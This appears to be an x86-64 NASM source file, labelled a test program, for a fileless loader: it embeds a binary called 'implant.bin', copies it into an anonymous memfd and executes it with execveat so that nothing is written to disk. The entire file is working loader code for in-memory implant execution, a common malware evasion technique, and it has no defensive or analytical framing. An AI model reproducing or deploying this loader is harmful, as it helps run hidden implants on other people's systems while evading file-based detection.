;------------------------------------------------------------------------------
; Test program for executing an embedded payload via memfd + execveat.
;
; This program demonstrates the complete workflow of loading an in‑memory
; ELF binary and executing it without touching the filesystem:
;   1. Create a memfd (anonymous file descriptor) with a given name.
;   2. Write the entire embedded payload (implant.bin) into the memfd.
;   3. Execute the memfd using exec_memfd (which wraps execveat with AT_EMPTY_PATH).
;
; If any step fails, the program exits with status 1. On success, the current
; process is replaced by the payload (exec_memfd does not return).
;
; External functions used:
;   - create_memfd : creates a memfd file descriptor.
;   - write_all    : writes the entire buffer to the file descriptor.
;   - exec_memfd   : executes the program from the memfd using execveat.
;
; Syscalls used directly:
;   - exit         : only on error paths.
;
; This is a minimal end‑to‑end test for the memfd execution infrastructure.
;------------------------------------------------------------------------------

%include "../include/syscalls.inc"   ; Provides SYS_exit

extern create_memfd
extern write_all
extern exec_memfd

section .data
    name        db "exec_test", 0       ; Name for the memfd (visible in /proc)
    argv0       db "implant", 0         ; Argument 0 (program name) for the executed payload
    argv        dq argv0, 0              ; argv array: pointer to name, null terminator

section .rodata
    payload_bin incbin "../payload/implant.bin"   ; Embed the payload binary
    payload_end equ         $
    payload_len equ         payload_end - payload_bin   ; Size of the payload

section .text
global _start

;------------------------------------------------------------------------------
; Entry point: _start
;
; Steps:
;   1. Call create_memfd to obtain a file descriptor for a new anonymous file.
;   2. Write the entire embedded payload into that memfd using write_all.
;   3. Execute the memfd with exec_memfd, passing the prepared argv.
;   4. If any step fails (create_memfd returns negative, write_all returns non‑zero,
;      or exec_memfd returns), exit with status 1.
;
; Note: exec_memfd does not return on success; it replaces the current process.
;------------------------------------------------------------------------------
_start:
    ; ------------------------------------------------------------------------
    ; Step 1: Create a memfd with sealing disabled (flags = 0).
    ; create_memfd(name, flags)
    ; ------------------------------------------------------------------------
    mov rdi,    name                     ; Pointer to the name string
    xor esi,    esi                       ; flags = 0 (no sealing)
    call        create_memfd
    test eax,   eax                       ; Check for error (negative return)
    js  .error                             ; If negative, jump to error exit

    ; Save the file descriptor in a callee‑saved register (r12).
    mov r12,    rax                       ; r12 = memfd fd

    ; ------------------------------------------------------------------------
    ; Step 2: Write the entire payload into the memfd.
    ; write_all(fd, buffer, size)
    ; ------------------------------------------------------------------------
    mov rdi,    r12                       ; fd
    lea rsi,    [payload_bin]              ; source buffer (embedded payload)
    mov rdx,    payload_len                ; number of bytes to write
    call        write_all
    test eax,   eax                       ; write_all returns 0 on success
    jnz .error                             ; Non‑zero indicates failure

    ; ------------------------------------------------------------------------
    ; Step 3: Execute the memfd.
    ; exec_memfd(fd, argv, envp)
    ;   - fd: the memfd file descriptor
    ;   - argv: pointer to the argument array (["implant", NULL])
    ;   - envp: NULL (use current environment)
    ;
    ; If successful, this call does not return. If it returns, an error occurred.
    ; ------------------------------------------------------------------------
    mov rdi,    r12                       ; fd
    lea rsi,    [argv]                     ; argv
    xor edx,    edx                        ; envp = NULL
    call exec_memfd

    ; If we reach here, exec_memfd failed. Fall through to error.

.error:
    ; ------------------------------------------------------------------------
    ; Error path: exit with status 1.
    ; ------------------------------------------------------------------------
    mov edi,    1                          ; exit status 1
    mov eax,    SYS_exit
    syscall
